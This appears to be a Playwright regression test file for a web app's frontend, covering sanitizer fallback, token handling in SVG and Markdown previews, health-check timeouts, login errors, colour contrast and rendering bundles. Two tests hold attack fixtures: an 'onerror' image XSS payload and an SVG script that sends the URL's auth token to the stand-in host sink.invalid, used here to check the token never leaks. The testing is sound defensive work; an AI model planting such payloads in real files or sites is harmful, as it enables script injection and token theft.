"""Release regressions at resource, dependency and connection boundaries."""
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

import pytest
from playwright.sync_api import expect

from .test_chat_render_perf import _app_eval, _login


def test_missing_sanitizer_is_plain_text_and_recovers_without_cached_fallback(page, backend_url, auth_token):
    page.route("**/static/vendor/purify.min.js*", lambda route: route.abort())
    _login(page, backend_url, auth_token)
    payload = '<img src="/absent" onerror="window.auditMarker=true"> **safe** ' + "ordinary text " * 15
    result = _app_eval(page, """
      window.auditMarker = false;
      const output = app.mdRender(arg);
      const fixture = document.createElement('div'); fixture.id = 'security-fixture';
      fixture.innerHTML = output; document.body.append(fixture);
      app._previewCacheSet('security-cache.md', {mode:'md',rawText:arg,renderedMd:output});
      return {sanitizer:!!window.DOMPurify, cached:app._mdCache?.has(arg) || false,
        images:fixture.querySelectorAll('img').length, text:fixture.textContent.includes('<img')};
    """, payload)
    assert result == {"sanitizer": False, "cached": False, "images": 0, "text": True}
    assert page.evaluate("window.auditMarker") is False
    page.unroute("**/static/vendor/purify.min.js*")
    page.add_script_tag(path=str(Path(__file__).resolve().parents[2] / "frontend/vendor/purify.min.js"))
    restored = _app_eval(page, """
      const fixture = document.querySelector('#security-fixture');
      fixture.innerHTML = app._previewCacheGet('security-cache.md').renderedMd;
      return {strong:fixture.querySelector('strong')?.textContent,
        unsafe:fixture.querySelector('[onerror]') !== null};
    """, payload)
    assert restored == {"strong": "safe", "unsafe": False}
    assert page.evaluate("window.auditMarker") is False


def test_svg_navigation_and_markdown_resources_never_receive_global_token(page, backend_url, auth_token):
    _login(page, backend_url, auth_token)
    svg = '''<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[
      var im=document.createElementNS('http://www.w3.org/2000/svg','image');
      im.setAttribute('href','https://sink.invalid/probe?captured='+encodeURIComponent(new URLSearchParams(location.search).get('token')));
      document.documentElement.appendChild(im);
    ]]></script><text y="20">fixture</text></svg>'''
    for path, content in [("release-fixture.svg", svg), ("release-fixture.md", "![fixture](release-fixture.svg)")]:
        assert page.request.put(backend_url + "/api/files/write", headers={"X-Auth-Token": auth_token}, data={"path": path, "content": content}).ok
    _app_eval(page, "await app.openFile({path:'release-fixture.md',name:'release-fixture.md'});")
    page.wait_for_function("""() => {
      const app=document.querySelector('#app')._x_dataStack[0];
      return app.renderedMd.includes('ticket=preview.') && !app.renderedMd.includes('token=');
    }""")
    url = _app_eval(page, "return app.rawUrl('release-fixture.svg');")
    assert "ticket=preview." in url and "token=" not in url
    captured = []
    viewer = page.context.new_page()
    viewer.route("https://sink.invalid/**", lambda route: (captured.append(parse_qs(urlsplit(route.request.url).query).get("captured", [""])[0]), route.fulfill(status=204)))
    try:
        viewer.goto(backend_url + url)
        viewer.wait_for_timeout(100)
        # Legacy copied URLs also redirect before executing any SVG script.
        viewer.goto(backend_url + "/api/files/raw?path=release-fixture.svg&token=" + auth_token)
        viewer.wait_for_timeout(100)
        assert "token=" not in viewer.url
        assert "ticket=preview." in viewer.url
        assert captured and auth_token not in captured
    finally:
        viewer.close()
    # Cached Markdown restores scoped URLs rather than blank/past-token markup.
    _app_eval(page, "await app.openFile({path:'notes.md',name:'notes.md'}); await app.openFile({path:'release-fixture.md',name:'release-fixture.md'});")
    page.wait_for_function("""() => {
      const app=document.querySelector('#app')._x_dataStack[0];
      return app.previewMode==='md' && app.renderedMd.includes('ticket=preview.') && !app.renderedMd.includes('token=');
    }""")


@pytest.mark.parametrize("hang", ["headers", "body"])
def test_health_deadline_is_single_flight_and_recovers(page, backend_url, auth_token, hang):
    _login(page, backend_url, auth_token)
    result = _app_eval(page, """
      clearInterval(app._connHeartbeat); app._cancelHealthRequest();
      const original=window.fetch; let calls=0, signals=[];
      app.REQUEST_DEADLINE_MS=80;
      app.refreshSessions=()=>{}; app.fetchContextInfo=()=>{};
      app.fetchTerminals=()=>{}; app.fetchSchedulerUnread=()=>{};
      window.fetch=async (url,options) => {
        if (url!=='/api/meta') return original(url,options);
        calls++; signals.push(options.signal);
        if(calls>2) return new Response(JSON.stringify({terminal_enabled:true}));
        if(arg==='headers') return await new Promise(()=>{});
        return {ok:true,json:()=>new Promise(()=>{})};
      };
      try {
        await Promise.all(Array.from({length:6},()=>app._pingHealth()));
        const first={calls,fails:app._connFails,held:!!app._healthAbort};
        await app._pingHealth(); const failed=app.connState;
        await app._pingHealth();
        return {first,failed,recovered:app.connState,fails:app._connFails,
          terminal:app.terminalEnabled,requests:calls,aborted:signals.slice(0,2).every(signal=>signal.aborted)};
      } finally {window.fetch=original;app._cancelHealthRequest();}
    """, hang)
    assert result == {"first": {"calls": 1, "fails": 1, "held": False}, "failed": "reconnecting", "recovered": "reconnected", "fails": 0, "terminal": True, "requests": 3, "aborted": True}


def test_old_health_generation_cannot_override_new_connection(page, backend_url, auth_token):
    _login(page, backend_url, auth_token)
    result = _app_eval(page, """
      clearInterval(app._connHeartbeat);app._cancelHealthRequest();
      const original=window.fetch;let release;
      window.fetch=()=>new Promise(resolve=>{release=resolve;});
      try {
        const pending=app._pingHealth();
        app._cancelHealthRequest(); app.connState='reconnected'; app._connFails=0;
        release(new Response('{}',{status:503})); await pending;
        return {state:app.connState,fails:app._connFails,held:!!app._healthAbort};
      } finally {window.fetch=original;}
    """)
    assert result == {"state": "reconnected", "fails": 0, "held": False}


@pytest.mark.parametrize("lang", ["zh", "en"])
@pytest.mark.parametrize("status", [401, 429, 503, "network"])
def test_login_distinguishes_credentials_rate_limits_and_service_failures(page, backend_url, lang, status):
    page.goto(backend_url)
    page.wait_for_selector(".login")
    _app_eval(page, "app.lang=arg;", lang)
    def fail(route):
        if status == "network":
            route.abort()
        else:
            route.fulfill(status=status, headers={"Retry-After": "12"}, json={"detail": "synthetic"})
    page.route("**/api/files/list?path=", fail)
    page.fill('.login input[type="password"]', "synthetic-login-test-token")
    page.keyboard.press("Enter")
    page.wait_for_function("document.querySelector('#app')._x_dataStack[0].loginErr !== ''")
    text = _app_eval(page, "return app.loginErr;")
    expected = {"zh": {401: "访问令牌无效", 429: "12 秒", 503: "服务暂时不可用", "network": "无法连接"}, "en": {401: "Invalid access token", 429: "12 seconds", 503: "temporarily unavailable", "network": "Unable to connect"}}
    assert expected[lang][status] in text


@pytest.mark.parametrize("theme", ["dark", "light", "eyecare"])
def test_all_accent_presets_have_readable_user_message_pairs(page, backend_url, auth_token, theme):
    _login(page, backend_url, auth_token)
    result = _app_eval(page, """
      app.theme=arg;document.documentElement.dataset.theme=arg;
      const fixture=document.createElement('div');fixture.className='msg user';
      fixture.innerHTML='<div class="bubble">Readable ordinary user text</div>';document.body.append(fixture);
      const colors=['#6093ff','#9b7cff','#38bcd8','#42b883','#d9a441','#dc6d88','#ffffff','#000000'];
      const ratios=colors.map(color=>{
        app.accent=color;app.applyAccent();const styles=getComputedStyle(fixture.firstChild);
        const hex=value=>'#'+value.match(/\\d+/g).slice(0,3).map(n=>Number(n).toString(16).padStart(2,'0')).join('');
        return app._colorContrast(hex(styles.color),hex(styles.backgroundColor));
      });fixture.remove();return ratios;
    """, theme)
    assert min(result) >= 4.5


def test_named_settings_fields_and_gateway_help_target(page, backend_url, auth_token):
    _login(page, backend_url, auth_token)
    _app_eval(page, "await app.openSettings('memory_engine');")
    # Labels are actual label[for] associations, including native checkboxes.
    expect(page.get_by_label("Mode", exact=True)).to_be_visible()
    for model in ["embedding-base-url", "vector-provider", "rerank-enabled"]:
        locator = page.locator("#setting-settings-memory-config-" + model)
        assert locator.count() == 1
        assert locator.evaluate("el => el.labels.length > 0")
    _app_eval(page, "await app.openSettings('defaults');")
    assert page.locator("#setting-settings-draftdefaults-model").evaluate("el => el.labels.length > 0")
    hints = _app_eval(page, "return app.PROVIDER_HELP.CODEX_GATEWAY_API_KEY;")
    assert hints["url"].startswith("https://github.com/hesorchen/muselab/")
    assert hints["urlZh"].endswith("codex-gateway_zh.md")
    assert hints["docs"] is True


def test_updated_local_math_and_diagram_bundles_render(page, backend_url, auth_token):
    _login(page, backend_url, auth_token)
    result = _app_eval(page, r"""
      await app._loadKatex();
      const math = window.katex.renderToString('\\frac{1}{2}', {throwOnError:true});
      const mermaid = await app._loadMermaid();
      const diagram = await mermaid.render('release-diagram', 'flowchart LR\n A[Start] --> B[Done]');
      return {math:math.includes('katex'), version:window.katex.version,
        svg:diagram.svg.includes('<svg'), labels:diagram.svg.includes('Start') && diagram.svg.includes('Done')};
    """)
    assert result == {"math": True, "version": "0.18.2", "svg": True, "labels": True}
